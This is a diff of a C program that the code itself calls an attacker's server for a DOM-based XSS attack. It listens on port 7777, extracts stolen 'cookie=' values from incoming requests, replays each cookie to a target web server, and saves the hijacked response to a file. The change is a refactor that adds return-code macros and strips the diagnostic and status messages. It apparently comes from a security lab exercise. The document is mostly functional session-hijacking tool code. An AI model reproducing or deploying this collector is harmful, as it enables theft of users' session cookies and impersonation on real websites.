@@ -24,6 +24,10 @@
 #define PORT 7777
 #define BUFFER_SIZE 8192
 #define OUTPUT_FILE "spoofed-dom.txt"
+// return value for failure
+#define FAILURE 0
+// return value for success
+#define SUCCESS 1
 
 /*
  * SET UP SERVERS SOCKET
@@ -33,21 +37,18 @@ static int setup_server_socket(void)
 {
   int fd = socket(AF_INET, SOCK_STREAM, 0);
   if (fd < 0) {
-    perror("socket");
     exit(EXIT_FAILURE);
   }
 
   int opt = 1;
   if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR,
                  &opt, (socklen_t)sizeof(opt)) < 0) {
-    perror("setsockopt SO_REUSEADDR");
     close(fd);
     exit(EXIT_FAILURE);
   }
 
   if (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT,
                  &opt, (socklen_t)sizeof(opt)) < 0) {
-    perror("setsockopt SO_REUSEPORT");
     close(fd);
     exit(EXIT_FAILURE);
   }
@@ -71,7 +72,7 @@ static int extract_cookie(const char *request,
 {
   const char *cookie_start = strstr(request, "cookie=");
   if (cookie_start == NULL) {
-    return 0;
+    return FAILURE;
   }
 
   cookie_start += strlen("cookie=");
@@ -88,11 +89,11 @@ static int extract_cookie(const char *request,
 
   size_t len = (size_t)(end - cookie_start);
   if (len == 0 || len >= out_size)
-    return 0;
+    return FAILURE;
 
   memcpy(cookie_out, cookie_start, len);
   cookie_out[len] = '\0';
-  return 1;
+  return SUCCESS;
 }
 /*
  * SERVER BIND AND LISTEN
@@ -105,13 +106,13 @@ static int bind_and_listen(int server_fd, struct sockaddr_in *server_addr)
 
   if (bind(server_fd, (struct sockaddr *)server_addr, sizeof(*server_addr))
       < 0) {
-    return 0;
+    return FAILURE;
   }
 
   if (listen(server_fd, 1) < 0) {
-    return 0;
+    return FAILURE;
   }
-  return 1;
+  return SUCCESS;
 }
 
 
@@ -123,7 +124,7 @@ static int bind_and_listen(int server_fd, struct sockaddr_in *server_addr)
 static int recv_response_from_web(int web_fd){
   FILE * output_file = fopen(OUTPUT_FILE, "w");
   if (!output_file) {
-    return 0;
+    return FAILURE;
   }
   char response_from_web[BUFFER_SIZE];
   memset(response_from_web,0,BUFFER_SIZE);
@@ -148,7 +149,7 @@ static int send_request_to_web(const char *cookie_id)
 {
   int web_fd = socket (AF_INET, SOCK_STREAM, 0);
   if (web_fd < 0) {
-    return 0;
+    return FAILURE;
   }
 
   struct sockaddr_in web_addr;
@@ -157,12 +158,12 @@ static int send_request_to_web(const char *cookie_id)
 
   if (inet_pton (AF_INET, WEB_IP, &web_addr.sin_addr) <= 0){
     close (web_fd);
-    return 0;
+    return FAILURE;
   }
 
   if (connect (web_fd, (struct sockaddr *) &web_addr, sizeof (web_addr)) < 0){
     close(web_fd);
-    return 0;
+    return FAILURE;
   }
 
   char request[BUFFER_SIZE];
@@ -176,20 +177,20 @@ static int send_request_to_web(const char *cookie_id)
 
   if (len <= 0 || len >= BUFFER_SIZE){
     close(web_fd);
-    return 0;
+    return FAILURE;
   }
 
   if (send (web_fd, request, strlen(request), 0) < 0){
     close(web_fd);
-    return 0;
+    return FAILURE;
   }
 
   if (recv_response_from_web (web_fd) != 1){
     close (web_fd);
-    return 0;
+    return FAILURE;
   }
   close(web_fd);
-  return 1;
+  return SUCCESS;
 }
 
 /*
@@ -217,13 +218,9 @@ int main(void) {
     memset(&addr, 0, sizeof(addr));
     int bind_n_listen = bind_and_listen(server_fd, &addr);
     if (bind_n_listen!=1){
-      printf("closed bind and listen");
       close(server_fd);
       exit(EXIT_FAILURE);
     }
-
-    printf("Attacker's server listening on port %d...\n", PORT);
-    printf("Waiting for stolen cookies from DOM-based XSS attack...\n");
 
     // ACCEPT CLIENT
     int accept_fd = -1;
@@ -268,5 +265,5 @@ int main(void) {
   close(server_fd);
   exit (EXIT_SUCCESS);
 
-    return 0;
+  exit(EXIT_SUCCESS);
 }
